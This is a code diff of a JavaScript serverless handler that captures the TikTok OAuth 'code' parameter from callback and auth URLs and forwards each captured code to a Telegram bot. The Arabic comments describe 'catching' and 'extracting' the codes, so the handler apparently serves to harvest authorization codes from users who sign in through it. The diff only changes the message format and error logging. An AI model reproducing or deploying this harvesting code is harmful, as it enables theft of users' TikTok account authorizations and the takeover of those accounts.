@@ -7,35 +7,33 @@ module.exports = async (req, res) => {
   
   const url = req.url || '';
 
-  // مسار التوثيق التلقائي لنطاق تيك توك
   if (url.includes('tiktok-developers-site-verification')) {
     res.setHeader('Content-Type', 'text/plain');
     return res.end('Tiktok-developers-site-verification=X0rbCBz0sv0XGnslTmw9ZyRWVDIdmha5');
   }
 
-  // مسار استقبال والتحقق والاستخراج
   if (url.includes('/api/callback') || url.includes('/api/auth')) {
     const urlParts = url.split('?');
     const queryString = urlParts.length > 1 ? urlParts[1] : '';
     const params = new URLSearchParams(queryString);
     const code = params.get('code');
 
-    // إذا تم لقط كود حقيقي، يتم إرساله فوراً إلى البوت
+    // إذا وُجد كود، نجبر السيرفر على انتظاره حتى يرسل للتليجرام بنجاح
     if (code) {
-      const messageText = `🎯 *تم استخراج رمز تيك توك جديد!*\n\n🔑 *الـ Code:* \`${code}\`\n\n⚙️ *المحرك:* AWR Central Engine`;
+      const messageText = `🎯 تم استخراج رمز تيك توك جديد!\n\n🔑 الـ Code هو:\n${code}\n\n⚙️ المحرك: AWR Central`;
       
       try {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+        await fetch(telegramUrl, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             chat_id: TELEGRAM_CHAT_ID,
-            text: messageText,
-            parse_mode: 'Markdown'
+            text: messageText
           })
         });
       } catch (err) {
-        console.error('Telegram notification failed:', err);
+        console.error('Telegram Error:', err);
       }
     }
 
